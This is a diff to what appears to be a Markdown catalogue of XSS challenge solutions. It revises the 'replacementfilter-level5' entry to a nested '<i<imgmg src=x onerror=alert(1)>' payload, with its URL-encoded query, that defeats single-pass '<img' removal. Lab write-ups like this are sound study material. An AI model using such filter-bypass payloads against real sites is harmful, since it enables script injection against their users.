@@ -32,10 +32,10 @@ String-replacement filters that miss case variants, nested duplication, or subst
 
 ### replacementfilter-level5
 
-`/replacementfilter/level5/?query=%3C%3Cimg%20src=x%20onerror=alert(1)%3E`
+`/replacementfilter/level5/?query=%3Ci%3Cimgmg%20src=x%20onerror=alert(1)%3E`
 
-- payload: `<<img src=x onerror=alert(1)>`
-- context: single-pass case-insensitive `<img` removal; doubled `<` bypass
+- payload: `<i<imgmg src=x onerror=alert(1)>`
+- context: single-pass case-insensitive `<img` removal; nest to reassemble
 
 ### replacementfilter-level6
 
